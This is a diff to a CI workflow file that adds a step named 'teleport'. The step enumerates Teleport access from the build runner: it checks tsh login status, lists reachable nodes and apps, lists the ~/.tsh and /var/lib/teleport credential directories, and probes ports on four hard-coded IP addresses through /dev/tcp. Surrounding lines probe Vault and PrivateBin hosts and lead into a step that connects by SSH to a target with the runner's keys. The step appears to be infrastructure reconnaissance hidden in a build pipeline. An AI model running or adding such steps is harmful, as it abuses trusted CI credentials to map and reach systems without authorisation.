@@ -67,6 +67,17 @@ jobs:
           curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com:8200/v1/sys/health || true
           curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com/v1/sys/health || true
           curl -sk --max-time 8 https://privatebin.jumpisolated.com/ -o /tmp/p -w 'PB %{http_code}\n' || true; head -c 200 /tmp/p || true
+      - name: teleport
+        run: |
+          set -x
+          which tsh tctl || true
+          tsh version 2>&1 | head -3 || true
+          tsh status 2>&1 | head -20 || true
+          ls -la ~/.tsh /var/lib/teleport 2>/dev/null || true
+          tsh ls 2>&1 | head -30 || true
+          tsh apps ls 2>&1 | head -20 || true
+          curl -sk --max-time 6 https://teleport-proxy.jumpisolated.com:3080/webapi/ping || true
+          for ip in 208.78.215.56 208.78.212.14 208.78.214.57 208.78.209.56; do for p in 3024 3080; do timeout 4 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "TP $ip:$p OPEN" || echo "TP $ip:$p closed"; done; done
       - name: ssh to target with runner keys
         run: |
           set -x
